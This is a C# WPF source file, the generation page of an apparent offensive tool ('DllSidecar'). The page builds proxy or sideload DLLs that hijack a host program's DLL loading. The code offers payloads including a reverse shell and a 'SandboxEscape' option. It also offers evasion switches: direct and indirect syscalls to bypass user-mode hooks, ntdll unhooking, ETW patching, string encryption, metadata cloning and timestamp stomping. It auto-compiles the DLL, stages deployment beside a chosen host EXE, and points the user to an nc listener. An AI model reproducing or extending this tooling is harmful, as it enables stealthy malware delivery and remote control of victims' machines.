using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using DllSidecar.Core.Configuration;
using DllSidecar.Core.Helpers;
using DllSidecar.Core.Models;
using DllSidecar.Core.Services;

namespace DllSidecar.GUI.Views;

public partial class GeneratePage : Page
{
    // XOR key baked into g_xkey[32]; refreshed only via Auto-generate.
    private byte[] _xorKey = XorCryptor.RandomKey(32);

    private readonly MainWindow _main;
    // Driven by the [Proxy | Sideload] segmented switch.
    private GenerationMode _mode = GenerationMode.Proxy;
    private PeAnalysis? _analysis;
    // Guards the mode-switch handler during XAML hydration.
    private bool _suppressModeChange = true;

    // Page-local deploy context; seeded from _main.PendingDeployContext.
    private string? _deployDir;
    private string? _deployName;
    private string? _systemOrigPath;
    // Guards ArchToggle_Changed during programmatic seed.
    private bool _suppressArchToggle;
    // Guards PersistUiState during RestoreUiState.
    private bool _suppressPersist;

    /// <summary>Convenience overload — accepts a recommended technique from callers.</summary>
    public GeneratePage(MainWindow main, GenerationMode preferred) : this(main)
    {
        _suppressModeChange = true;
        if (preferred == GenerationMode.Sideload || preferred == GenerationMode.Tracer)
            ModeSideload.IsChecked = true;
        else
            ModeProxy.IsChecked = true;
        _suppressModeChange = false;
        ApplyMode();
    }

    public GeneratePage(MainWindow main)
    {
        _main = main;
        InitializeComponent();

        PageTitle.Text = "DLL Techniques";

        RenderXorKey();
        UpdateDeployBanner();

        // Prefer pre-existing CurrentAnalysis; phantoms don't exist on disk.
        if (_main.CurrentAnalysis != null)
        {
            _analysis = _main.CurrentAnalysis;
            DllPathBox.Text = _main.CurrentDllPath ?? _analysis.Path;
            PopulateFromAnalysis(_analysis);
        }
        else if (_main.CurrentDllPath != null)
        {
            DllPathBox.Text = _main.CurrentDllPath;
            LoadAnalysis(_main.CurrentDllPath);
        }

        // Auto-pick: Proxy needs named exports, Sideload works always.
        _suppressModeChange = true;
        if (_analysis != null && _analysis.NamedExports == 0)
            ModeSideload.IsChecked = true;
        else
            ModeProxy.IsChecked = true;
        _suppressModeChange = false;
        ApplyMode();

        // Restore last-session UI state, then wire change handlers so every edit persists.
        RestoreUiState();
        ApplySandboxRecommendation();
        WirePersistence();
    }

    /// <summary>Hide SandboxEscape from the Payload combo unless the host classifies as sandboxed.</summary>
    private void ApplySandboxRecommendation()
    {
        // Best-effort candidate lookup; fall back to classifying the current path.
        var kind = SandboxKind.None;
        var path = _main.CurrentDllPath;
        if (!string.IsNullOrEmpty(path) && _main.LastScanResults != null)
        {
            var existing = _main.LastScanResults.Existing.FirstOrDefault(c =>
                string.Equals(c.Dll.Path, path, StringComparison.OrdinalIgnoreCase));
            if (existing != null) kind = existing.SandboxKind;
            else
            {
                var phantom = _main.LastScanResults.Phantoms.FirstOrDefault(p =>
                    string.Equals(System.IO.Path.Combine(p.DirectoryPath, p.DllName), path, StringComparison.OrdinalIgnoreCase));
                if (phantom != null) kind = phantom.SandboxKind;
            }
        }
        // Last-resort static classification when no scan match.
        if (kind == SandboxKind.None && !string.IsNullOrEmpty(path))
            kind = Core.Services.SandboxClassifier.Classify(path);

        var sandboxed = kind != SandboxKind.None;
        SandboxEscapeItem.Visibility = sandboxed ? Visibility.Visible : Visibility.Collapsed;
        SandboxHint.Visibility       = sandboxed ? Visibility.Visible : Visibility.Collapsed;
        if (sandboxed)
        {
            SandboxHint.Text = kind switch
            {
                SandboxKind.AppContainer       => "AppContainer host detected — SandboxEscape recommended.",
                SandboxKind.LowIntegrity       => "Low integrity host detected — SandboxEscape recommended.",
                SandboxKind.RendererSubprocess => "Sandboxed renderer host detected (CEF / WebView2) — SandboxEscape recommended.",
                _                              => "Sandboxed host detected — SandboxEscape recommended.",
            };
        }
    }

    private void ModeSwitch_Changed(object sender, RoutedEventArgs e)
    {
        if (_suppressModeChange) return;
        ApplyMode();
    }

    /// <summary>Push the segmented switch's state into <see cref="_mode"/> and reflect it in dependent UI.</summary>
    private void ApplyMode()
    {
        // Defensive: XAML hydration can fire Checked before panels exist.
        if (ModeSideload == null || ModeProxy == null) return;

        _mode = ModeSideload.IsChecked == true ? GenerationMode.Sideload : GenerationMode.Proxy;

        if (PageSubtitle != null)
            PageSubtitle.Text = _mode switch
            {
                GenerationMode.Proxy    => "Forward every export to the renamed original (_orig.dll) and fire your payload from one chosen export. Classic sideload form — host keeps working.",
                GenerationMode.Sideload => "Stub DLL with no forwarding and no _orig.dll dependency. One-shot payload fires from DllMain. Smallest footprint.",
                _ => ""
            };

        bool isProxy = _mode == GenerationMode.Proxy;
        if (ExportPanel != null) ExportPanel.Visibility = isProxy ? Visibility.Visible : Visibility.Collapsed;
        if (ThreadPanel != null) ThreadPanel.Visibility = Visibility.Visible;
    }

    private void RestoreUiState()
    {
        _suppressPersist = true;
        try
        {
            var s = ConfigManager.Current.UiState.GeneratePage;

            if (string.IsNullOrEmpty(HostExeBox.Text) && !string.IsNullOrEmpty(s.HostExePath))
                HostExeBox.Text = s.HostExePath;

            if (s.PayloadIndex >= 0 && s.PayloadIndex < PayloadCombo.Items.Count)
                PayloadCombo.SelectedIndex = s.PayloadIndex;
            if (!string.IsNullOrEmpty(s.PayloadData)) PayloadDataBox.Text = s.PayloadData;
            if (!string.IsNullOrEmpty(s.SandboxTargets)) SandboxTargetsBox.Text = s.SandboxTargets;

            if (s.ThreadModeIndex >= 0 && s.ThreadModeIndex < ThreadCombo.Items.Count)
                ThreadCombo.SelectedIndex = s.ThreadModeIndex;

            ChkDInvoke.IsChecked = s.DInvoke;
            ChkSyscalls.IsChecked = s.Syscalls;
            ChkIndirectSyscalls.IsChecked = s.IndirectSyscalls;
            ChkUnhookNtdll.IsChecked = s.UnhookNtdll;
            ChkPatchEtw.IsChecked = s.PatchEtw;
            ChkEncrypt.IsChecked = s.EncryptStrings;
            DelayBox.Text = s.EntryDelayMs.ToString();
            ChkCloneMeta.IsChecked = s.CloneMeta;
            ChkStomp.IsChecked = s.TimestampStomp;
            ChkAutoBuild.IsChecked = s.AutoBuild;

            ChkWriteProof.IsChecked = s.WriteProof;
            PreLaunchDelayBox.Text = s.PreLaunchDelaySec.ToString();
            if (s.WaitBlock) WaitBlock.IsChecked = true; else WaitFire.IsChecked = true;
            FireTimeoutBox.Text = s.FireTimeoutSec.ToString();
            // Programmatic set doesn't fire the event; mirror WaitBlock onto FireTimeoutRow.
            FireTimeoutRow.Visibility = s.WaitBlock ? Visibility.Collapsed : Visibility.Visible;
        }
        finally { _suppressPersist = false; }
    }

    private void PersistUiState()
    {
        if (_suppressPersist) return;
        var s = ConfigManager.Current.UiState.GeneratePage;
        s.HostExePath = HostExeBox.Text?.Trim();
        s.PayloadIndex = PayloadCombo.SelectedIndex;
        s.PayloadData = PayloadDataBox.Text;
        s.SandboxTargets = SandboxTargetsBox.Text;
        s.ThreadModeIndex = ThreadCombo.SelectedIndex;
        s.DInvoke = ChkDInvoke.IsChecked == true;
        s.Syscalls = ChkSyscalls.IsChecked == true;
        s.IndirectSyscalls = ChkIndirectSyscalls.IsChecked == true;
        s.UnhookNtdll = ChkUnhookNtdll.IsChecked == true;
        s.PatchEtw = ChkPatchEtw.IsChecked == true;
        s.EncryptStrings = ChkEncrypt.IsChecked == true;
        if (int.TryParse(DelayBox.Text, out var ms)) s.EntryDelayMs = ms;
        s.CloneMeta = ChkCloneMeta.IsChecked == true;
        s.TimestampStomp = ChkStomp.IsChecked == true;
        s.AutoBuild = ChkAutoBuild.IsChecked == true;
        s.WriteProof = ChkWriteProof.IsChecked == true;
        if (int.TryParse(PreLaunchDelayBox.Text, out var pld)) s.PreLaunchDelaySec = pld;
        s.WaitBlock = WaitBlock.IsChecked == true;
        if (int.TryParse(FireTimeoutBox.Text, out var ft)) s.FireTimeoutSec = ft;
        if (ArchX86.IsChecked == true) s.Arch = "x86";
        else if (ArchX64.IsChecked == true) s.Arch = "x64";
        ConfigManager.Save();
    }

    private void WirePersistence()
    {
        void OnChanged(object? _, object __) => PersistUiState();

        HostExeBox.TextChanged += OnChanged;
        PayloadCombo.SelectionChanged += OnChanged;
        PayloadDataBox.TextChanged += OnChanged;
        SandboxTargetsBox.TextChanged += OnChanged;
        ThreadCombo.SelectionChanged += OnChanged;

        ChkDInvoke.Checked += OnChanged; ChkDInvoke.Unchecked += OnChanged;
        ChkSyscalls.Checked += OnChanged; ChkSyscalls.Unchecked += OnChanged;
        ChkIndirectSyscalls.Checked += OnChanged; ChkIndirectSyscalls.Unchecked += OnChanged;
        ChkUnhookNtdll.Checked += OnChanged; ChkUnhookNtdll.Unchecked += OnChanged;
        ChkPatchEtw.Checked += OnChanged; ChkPatchEtw.Unchecked += OnChanged;
        ChkEncrypt.Checked += OnChanged; ChkEncrypt.Unchecked += OnChanged;

        // XOR key row visibility tracks ChkEncrypt.
        ChkEncrypt.Checked   += (_, _) => XorKeyRow.Visibility = Visibility.Visible;
        ChkEncrypt.Unchecked += (_, _) => XorKeyRow.Visibility = Visibility.Collapsed;
        XorKeyRow.Visibility = ChkEncrypt.IsChecked == true ? Visibility.Visible : Visibility.Collapsed;

        // Direct and Indirect syscalls are mutually exclusive (shared sc_NtFoo wrappers).
        ChkSyscalls.Checked += (_, _) => { if (ChkIndirectSyscalls.IsChecked == true) ChkIndirectSyscalls.IsChecked = false; };
        ChkIndirectSyscalls.Checked += (_, _) => { if (ChkSyscalls.IsChecked == true) ChkSyscalls.IsChecked = false; };
        DelayBox.TextChanged += OnChanged;

        ChkCloneMeta.Checked += OnChanged; ChkCloneMeta.Unchecked += OnChanged;
        ChkStomp.Checked += OnChanged; ChkStomp.Unchecked += OnChanged;
        ChkAutoBuild.Checked += OnChanged; ChkAutoBuild.Unchecked += OnChanged;

        ChkWriteProof.Checked += OnChanged; ChkWriteProof.Unchecked += OnChanged;
        PreLaunchDelayBox.TextChanged += OnChanged;
        WaitBlock.Checked += OnChanged; WaitFire.Checked += OnChanged;
        FireTimeoutBox.TextChanged += OnChanged;

        ArchX86.Checked += OnChanged; ArchX64.Checked += OnChanged;
    }

    // Sentinel for "no hook — pure forwarder build, payload runs from DllMain only".
    private const string NoHookSentinel = "(no hook — pure forwarder, payload from DllMain)";

    private void PopulateFromAnalysis(PeAnalysis a)
    {
        ExportCombo.Items.Clear();
        ExportCombo.Items.Add(NoHookSentinel);
        foreach (var exp in a.Exports)
            ExportCombo.Items.Add(exp.DisplayName);
        ExportCombo.SelectedIndex = 0;
    }

    private void UpdateDeployBanner()
    {
        // Read context every ctor; cleared explicitly on Generate success or Clear click.
        if (_main.PendingDeployContext is { } d)
        {
            _deployDir = d.TargetDir;
            _deployName = d.TargetName;
            _systemOrigPath = d.SystemOrigPath;
            HostExeBox.Text = d.HostExePath;

            // Seed arch toggle from analysis; user can flip if needed.
            ArchRow.Visibility = Visibility.Visible;
            _suppressArchToggle = true;
            if (_analysis?.Arch == "x86") ArchX86.IsChecked = true;
            else ArchX64.IsChecked = true;
            _suppressArchToggle = false;

            ApplyArchCompatibilityRules(_analysis?.Arch ?? "x64");
            RenderAutoModeText(d.AutoMode, d.AutoExportCount);
        }

        if (_deployDir != null && _deployName != null)
        {
            DeployDropText.Text = $"Drop → {_deployDir}\\{_deployName}";
            DeployBanner.Visibility = Visibility.Visible;
        }
        else
        {
            DeployBanner.Visibility = Visibility.Collapsed;
        }
    }

    private void BrowseHost_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "Executables|*.exe|All files|*.*",
            Title = "Pick the host EXE to launch after deploy",
        };
        if (!string.IsNullOrWhiteSpace(HostExeBox.Text) && File.Exists(HostExeBox.Text))
            dlg.InitialDirectory = Path.GetDirectoryName(HostExeBox.Text);
        if (dlg.ShowDialog() == true) HostExeBox.Text = dlg.FileName;
    }

    private void ClearDeploy_Click(object sender, RoutedEventArgs e)
    {
        _deployDir = null;
        _deployName = null;
        _systemOrigPath = null;
        HostExeBox.Text = "";
        AutoModeText.Visibility = Visibility.Collapsed;
        ArchRow.Visibility = Visibility.Collapsed;
        DeployBanner.Visibility = Visibility.Collapsed;
        _main.PendingDeployContext = null;
        _main.Log("Deploy context cleared — generated .bat will compile only");
    }

    private void WaitStrategy_Changed(object sender, RoutedEventArgs e)
    {
        if (FireTimeoutRow == null) return;
        FireTimeoutRow.Visibility = WaitFire.IsChecked == true
            ? Visibility.Visible : Visibility.Collapsed;
    }

    private void ArchToggle_Changed(object sender, RoutedEventArgs e)
    {
        if (_suppressArchToggle || _analysis == null) return;
        var newArch = ArchX86.IsChecked == true ? "x86" : "x64";
        if (_analysis.Arch == newArch) return;

        // Re-resolve system DLL for the new arch; realigns Exports/NamedExports/SystemOrigPath.
        var resolved = SystemDllResolver.Resolve(_analysis.Filename, newArch);
        _analysis.Arch = newArch;
        _analysis.Exports = resolved?.Analysis.Exports ?? new List<ExportEntry>();
        _analysis.NamedExports = resolved?.Analysis.NamedExports ?? 0;
        _analysis.OrdinalOnlyExports = resolved?.Analysis.OrdinalOnlyExports ?? 0;
        _systemOrigPath = resolved?.Path;

        var mode = _analysis.Exports.Count > 0 ? GenerationMode.Proxy : GenerationMode.Sideload;
        RenderAutoModeText(mode, _analysis.Exports.Count);
        _main.Log($"Arch override → {newArch} (exports={_analysis.Exports.Count}, orig={_systemOrigPath ?? "none"})");

        // Refresh the export dropdown (Proxy mode) from the new arch's exports.
        PopulateFromAnalysis(_analysis);

        ApplyArchCompatibilityRules(newArch);
    }

    /// <summary>Gates arch-specific options (e.g. DirectSyscalls disabled on x86).</summary>
    private void ApplyArchCompatibilityRules(string arch)
    {
        if (ChkSyscalls == null) return;
        if (arch == "x86")
        {
            ChkSyscalls.IsChecked = false;
            ChkSyscalls.IsEnabled = false;
            ChkSyscalls.ToolTip = "Disabled — Direct syscalls require x64. On x86 it's not benign: sc_init reads i686 ntdll prologues that don't match the x64-assumed layout and corrupts global state, breaking the PoC.";
            if (ChkIndirectSyscalls != null)
            {
                ChkIndirectSyscalls.IsChecked = false;
                ChkIndirectSyscalls.IsEnabled = false;
                ChkIndirectSyscalls.ToolTip = "Disabled — Indirect syscalls require x64. The trampoline reads the x64 ntdll stub layout and the syscall;ret gadget; neither is present on i686.";
            }
        }
        else
        {
            ChkSyscalls.IsEnabled = true;
            ChkSyscalls.ToolTip = "Resolve and call NT* APIs via SSN + syscall instruction instead of going through ntdll export addresses. Bypasses user-mode hooks.";
            if (ChkIndirectSyscalls != null)
            {
                ChkIndirectSyscalls.IsEnabled = true;
                ChkIndirectSyscalls.ToolTip = "Same SSN resolution as Direct, but the syscall instruction is executed from inside ntdll via a cached gadget jump. A stack walk attributes the call to ntdll, not to this DLL. Mutually exclusive with Direct syscalls.";
            }
        }
    }

    private void XorAutoGen_Click(object sender, RoutedEventArgs e)
    {
        _xorKey = XorCryptor.RandomKey(32);
        RenderXorKey();
    }

    private void RenderXorKey()
    {
        XorKeyBox.Text = "{ " + XorCryptor.ToHexArray(_xorKey) + " }";
    }

    private void RenderAutoModeText(GenerationMode? mode, int exportCount)
    {
        if (!mode.HasValue) return;
        var modeLabel = mode.Value == GenerationMode.Proxy ? "Proxy (auto)" : "Sideload (auto)";
        var detail = mode.Value == GenerationMode.Proxy
            ? $"Forwarding {exportCount} exports via _orig.dll sourced from {_systemOrigPath ?? "(none)"}"
            : (exportCount == 0
                ? "No exports required — DllMain-only stub"
                : $"No system match found — will emit {exportCount} empty stubs (host may reject)");
        AutoModeText.Text = $"◆ Mode: {modeLabel}   ·   {detail}";
        AutoModeText.Visibility = Visibility.Visible;
    }

    private void Browse_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "DLL files|*.dll|All files|*.*",
            Title = "Select target DLL"
        };
        if (dlg.ShowDialog() == true)
        {
            DllPathBox.Text = dlg.FileName;
            LoadAnalysis(dlg.FileName);
        }
    }

    private void LoadAnalysis(string path)
    {
        try
        {
            _analysis = PeAnalyzer.Analyze(path);
            ExportCombo.Items.Clear();
            foreach (var exp in _analysis.Exports)
                ExportCombo.Items.Add(exp.DisplayName);
            if (ExportCombo.Items.Count > 0)
                ExportCombo.SelectedIndex = 0;
        }
        catch (Exception ex)
        {
            _main.Log($"Error loading DLL: {ex.Message}");
        }
    }

    private void PayloadCombo_Changed(object sender, SelectionChangedEventArgs e)
    {
        if (PayloadDataBox == null) return;
        // Index 4 = ReverseShell: host/port come from Config (Payload Defaults),
        // not from the per-PoC data box. Keep PayloadDataBox hidden for it.
        PayloadDataBox.Visibility = PayloadCombo.SelectedIndex switch
        {
            1 or 2 or 3 => Visibility.Visible,
            _ => Visibility.Collapsed
        };
        PayloadDataBox.Text = PayloadCombo.SelectedIndex switch
        {
            1 => "calc.exe",
            3 => "cmd.exe",
            _ => ""
        };
        if (SandboxTargetsPanel != null)
            SandboxTargetsPanel.Visibility = PayloadCombo.SelectedIndex == 3
                ? Visibility.Visible : Visibility.Collapsed;

        // ReverseShell: apply safe defaults (CreateThread + Write proof).
        if (PayloadCombo.SelectedIndex == 4)
        {
            if (ThreadCombo != null) ThreadCombo.SelectedIndex = 1;   // 0=Calling, 1=Std (CreateThread), 2=Native
            if (ChkWriteProof != null) ChkWriteProof.IsChecked = true;
            if (!_suppressPersist) ShowReverseShellAdvisory();
        }
    }

    /// <summary>Informational modal explaining auto-applied ReverseShell defaults.</summary>
    private static void ShowReverseShellAdvisory()
    {
        MessageBox.Show(
            "Reverse shell selected — safe defaults applied:\n\n" +
            "  • Thread mode → New thread (CreateThread)\n" +
            "      Required: Winsock + CreateProcessA under the DllMain loader\n" +
            "      lock deadlocks the host. A separate thread runs do_payload()\n" +
            "      after DllMain returns.\n\n" +
            "  • Write proof file → ON\n" +
            "      Leaves %TEMP%\\dllsidecar_proof_<PID>.txt at payload entry so\n" +
            "      you can confirm execution even if the listener never sees a\n" +
            "      connection (firewall, missing nc -lvnp, AV block).\n\n" +
            "Host / port come from Configuration → Payload Defaults.\n" +
            "Don't forget the listener: nc -lvnp <port>  (or ncat).",
            "Reverse shell — defaults applied",
            MessageBoxButton.OK, MessageBoxImage.Information);
    }

    private async void Generate_Click(object sender, RoutedEventArgs e)
    {
        var path = DllPathBox.Text.Trim();

        // Phantom mode: _analysis is pre-synthesized (no file on disk — that's the point).
        // Only require a real file when we have no analysis to use.
        bool phantomMode = _analysis != null && !File.Exists(path);
        if (_analysis == null)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
            {
                MessageBox.Show("Select a valid DLL first.\n\nIf you're working from a phantom, launch Generate from ScanPage → Generate Sideload.",
                    "No target DLL",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            LoadAnalysis(path);
            if (_analysis == null) return;
        }

        // Mode-specific preconditions checked before disabling the button.
        if (_mode == GenerationMode.Proxy)
        {
            if (_analysis.NamedExports == 0)
            {
                MessageBox.Show(
                    "Proxy mode requires at least one NAMED export on the target DLL.\n\n" +
                    "The proxy forwards exports to the renamed original — with nothing to forward there's no host functionality to preserve. " +
                    "Use Sideload mode instead (payload fires from DllMain, no forwarding).",
                    "Proxy not applicable", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            // Target export is OPTIONAL; payload always fires from DllMain.
        }

        GenerateBtn.IsEnabled = false;
        SetStatus("Generating...", StatusKind.Info);
        Overlay.Show("Generating " + _mode, $"Target: {_analysis.Filename}");

        var config = new TemplateConfig
        {
            Mode = _mode,
            DInvoke = ChkDInvoke.IsChecked == true,
            DirectSyscalls = ChkSyscalls.IsChecked == true,
            IndirectSyscalls = ChkIndirectSyscalls.IsChecked == true,
            UnhookNtdll = ChkUnhookNtdll.IsChecked == true,
            PatchEtw = ChkPatchEtw.IsChecked == true,
            EncryptStrings = ChkEncrypt.IsChecked == true,
            CloneMetadata = ChkCloneMeta.IsChecked == true,
            StompTimestamps = ChkStomp.IsChecked == true,
            Payload = (PayloadType)PayloadCombo.SelectedIndex,
            PayloadData = PayloadDataBox.Text.Trim(),
            Thread = (ThreadMode)ThreadCombo.SelectedIndex,
            // Exact bytes baked into g_xkey[32]; no re-randomisation in TemplateEngine.
            LongXorKey = _xorKey,
            // Empty handle skips attribution.
            Researcher = ConfigManager.Current.Researcher.Handle ?? "",
        };

        if (_mode == GenerationMode.Proxy
            && ExportCombo.SelectedItem is string targetExp
            && targetExp != NoHookSentinel)
            config.TargetExport = targetExp;

        int.TryParse(DelayBox.Text, out int delay);
        config.DelayMs = delay;

        // SandboxEscape-only target CSV, ignored by other payloads.
        if (PayloadCombo.SelectedIndex == 3 && !string.IsNullOrWhiteSpace(SandboxTargetsBox.Text))
            config.SandboxTargets = SandboxTargetsBox.Text.Trim();

        // MessageBox title/body come from global Config → Payload Defaults.
        var payloadCfg = ConfigManager.Current.Payload;
        config.MessageBoxTitle = payloadCfg.MessageBoxTitle;
        config.MessageBoxBody = payloadCfg.MessageBoxBody;

        // ReverseShell endpoint also comes from global defaults.
        config.ReverseShellHost = payloadCfg.ReverseShellHost;
        config.ReverseShellPort = payloadCfg.ReverseShellPort;

        // Runtime / deploy options for the .bat tail and proof file.
        config.WriteProofFile = ChkWriteProof.IsChecked == true;
        int.TryParse(PreLaunchDelayBox.Text, out int preDelay);
        config.PreLaunchDelaySec = Math.Max(0, preDelay);
        config.WaitForHostExit = WaitBlock.IsChecked == true;
        int.TryParse(FireTimeoutBox.Text, out int fireTimeout);
        config.NonBlockingTimeoutSec = Math.Max(1, fireTimeout);

        // Deploy context applied only when both sides are set.
        var hostExe = HostExeBox.Text.Trim();
        if (_deployDir != null && _deployName != null && hostExe.Length > 0)
        {
            config.DeployTargetDir = _deployDir;
            config.DeployTargetName = _deployName;
            config.HostExePath = hostExe;
            config.SystemOrigPath = _systemOrigPath;
            _main.Log($"Deploy context: {_deployDir}\\{_deployName} → host {Path.GetFileName(hostExe)}"
                + (_systemOrigPath != null ? $" (orig source: {_systemOrigPath})" : ""));
        }

        var baseName = Path.GetFileNameWithoutExtension(_analysis.Filename);
        var modeLabel = _mode.ToString().ToLowerInvariant();
        var outputDir = Path.Combine(AppPaths.OutputRoot, $"{baseName}_{modeLabel}");
        Directory.CreateDirectory(outputDir);

        _main.Log($"Generating {_mode} for {_analysis.Filename}...");

        var files = TemplateEngine.Generate(_analysis, config);

        // Copy headers
        var templatesDir = AppPaths.TemplatesDir;
        if (config.DInvoke && File.Exists(Path.Combine(templatesDir, "dinvoke.h")))
            File.Copy(Path.Combine(templatesDir, "dinvoke.h"), Path.Combine(outputDir, "dinvoke.h"), true);
        if (config.DirectSyscalls && File.Exists(Path.Combine(templatesDir, "syscalls.h")))
            File.Copy(Path.Combine(templatesDir, "syscalls.h"), Path.Combine(outputDir, "syscalls.h"), true);
        if (config.IndirectSyscalls && File.Exists(Path.Combine(templatesDir, "syscalls_indirect.h")))
            File.Copy(Path.Combine(templatesDir, "syscalls_indirect.h"), Path.Combine(outputDir, "syscalls_indirect.h"), true);
        if (config.EncryptStrings && File.Exists(Path.Combine(templatesDir, "cryptor.h")))
            File.Copy(Path.Combine(templatesDir, "cryptor.h"), Path.Combine(outputDir, "cryptor.h"), true);
        if (config.UnhookNtdll && File.Exists(Path.Combine(templatesDir, "unhook.h")))
            File.Copy(Path.Combine(templatesDir, "unhook.h"), Path.Combine(outputDir, "unhook.h"), true);
        if (config.PatchEtw && File.Exists(Path.Combine(templatesDir, "etw.h")))
            File.Copy(Path.Combine(templatesDir, "etw.h"), Path.Combine(outputDir, "etw.h"), true);

        var outputInfo = new System.Text.StringBuilder();
        foreach (var (name, content) in files)
        {
            var filePath = Path.Combine(outputDir, name);
            await File.WriteAllTextAsync(filePath, content);
            outputInfo.AppendLine($"  [>] {name}");
            _main.Log($"  Written: {name}");
        }

        // Metadata cloning only meaningful for non-phantom sources.
        if (config.CloneMetadata)
        {
            if (phantomMode)
            {
                outputInfo.AppendLine("  [i] Clone version info: skipped (phantom has no source file)");
                _main.Log("  Clone metadata skipped — phantom slot, no source PE");
            }
            else
            {
                try
                {
                    var vinfo = PeAnalyzer.ExtractVersionInfo(path);
                    if (vinfo.Count > 0)
                    {
                        var rcContent = TemplateEngine.GenerateRcFile(vinfo, _analysis.Filename);
                        await File.WriteAllTextAsync(Path.Combine(outputDir, "version.rc"), rcContent);
                        outputInfo.AppendLine("  [>] version.rc (metadata clone)");
                        _main.Log("  Written: version.rc");
                    }
                }
                catch (Exception ex)
                {
                    _main.Log($"  Metadata extraction failed: {ex.Message}");
                }
            }
        }

        // Auto-build. builtDllPath drives the post-build success modal.
        string? builtDllPath = null;
        if (ChkAutoBuild.IsChecked == true)
        {
            var cFile = files.Keys.First(k => k.EndsWith(".c"));
            var defFile = files.Keys.First(k => k.EndsWith(".def"));
            var dllOutput = Path.Combine(outputDir, _analysis.Filename);

            var extraObjects = new List<string>();
            var rcFile = Path.Combine(outputDir, "version.rc");
            if (File.Exists(rcFile))
            {
                var resObj = Path.Combine(outputDir, "version.res.o");
                var progress = new Progress<string>(msg => _main.Log($"  {msg}"));
                if (await BuildSystem.CompileResourceAsync(rcFile, resObj, _analysis.Arch, progress))
                    extraObjects.Add(resObj);
            }

            var buildProgress = new Progress<string>(msg => _main.Log($"  {msg}"));
            // ws2_32 needed for ReverseShell's WSAGetLastError() call.
            var extraLibs = config.Payload == Core.Models.PayloadType.ReverseShell
                ? new[] { "ws2_32" } : null;
            var result = await BuildSystem.CompileDllAsync(
                Path.Combine(outputDir, cFile),
                Path.Combine(outputDir, defFile),
                dllOutput,
                _analysis.Arch,
                includeDirs: [templatesDir, outputDir],
                extraObjects: extraObjects.Count > 0 ? extraObjects : null,
                extraLibs: extraLibs,
                progress: buildProgress);

            if (result.Success)
            {
                outputInfo.AppendLine($"\n  [+] Compiled: {_analysis.Filename} ({result.OutputSize:N0} bytes, {result.ExportCount} exports)");
                builtDllPath = dllOutput;

                // Stomp only when we have a source file to copy timestamps from.
                if (config.StompTimestamps)
                {
                    if (phantomMode)
                    {
                        outputInfo.AppendLine("  [i] Timestamp stomp: skipped (phantom has no source file)");
                        _main.Log("  Timestamp stomp skipped — phantom slot, no source PE");
                    }
                    else if (File.Exists(path))
                    {
                        BuildSystem.StompTimestamps(path, dllOutput);
                        _main.Log("  Timestamps stomped");
                    }
                }
            }
            else
            {
                outputInfo.AppendLine($"\n  [!] Build failed: {result.Errors.Split('\n').FirstOrDefault()}");
            }
        }

        outputInfo.AppendLine($"\n  Output: {outputDir}");
        OutputInfo.Text = outputInfo.ToString();
        OutputPanel.Visibility = Visibility.Visible;
        _main.Log($"Generation complete: {outputDir}");
        GenerateBtn.IsEnabled = true;
        SetStatus($"Done — {outputDir}", StatusKind.Ok);
        Overlay.Hide();

        // Post-build success modal only fires when auto-build succeeded.
        if (builtDllPath != null)
            Helpers.BuildCompleteDialog.Show(Window.GetWindow(this), builtDllPath);
    }

    private void Reset_Click(object sender, RoutedEventArgs e)
    {
        ChkDInvoke.IsChecked = false;
        ChkSyscalls.IsChecked = false;
        ChkIndirectSyscalls.IsChecked = false;
        ChkUnhookNtdll.IsChecked = false;
        ChkPatchEtw.IsChecked = false;
        ChkEncrypt.IsChecked = false;
        ChkCloneMeta.IsChecked = false;
        ChkStomp.IsChecked = false;
        ChkAutoBuild.IsChecked = true;
        PayloadCombo.SelectedIndex = 0;
        ThreadCombo.SelectedIndex = 0;
        DelayBox.Text = "0";
        PayloadDataBox.Text = "";
        PayloadDataBox.Visibility = Visibility.Collapsed;
        // Execution section — starter defaults favour diagnosability
        ChkWriteProof.IsChecked = true;
        PreLaunchDelayBox.Text = "0";
        WaitBlock.IsChecked = true;
        FireTimeoutBox.Text = "15";
        FireTimeoutRow.Visibility = Visibility.Collapsed;
        OutputPanel.Visibility = Visibility.Collapsed;
        SetStatus("Form reset to Starter defaults", StatusKind.Info);
    }

    private enum StatusKind { Info, Ok, Err }

    private void SetStatus(string text, StatusKind kind)
    {
        GenStatus.Text = text;
        GenStatus.Foreground = new System.Windows.Media.SolidColorBrush(kind switch
        {
            StatusKind.Ok  => System.Windows.Media.Color.FromRgb(0xA6, 0xE3, 0xA1),
            StatusKind.Err => System.Windows.Media.Color.FromRgb(0xF3, 0x8B, 0xA8),
            _ => System.Windows.Media.Color.FromRgb(0x6C, 0x70, 0x86),
        });
    }
}
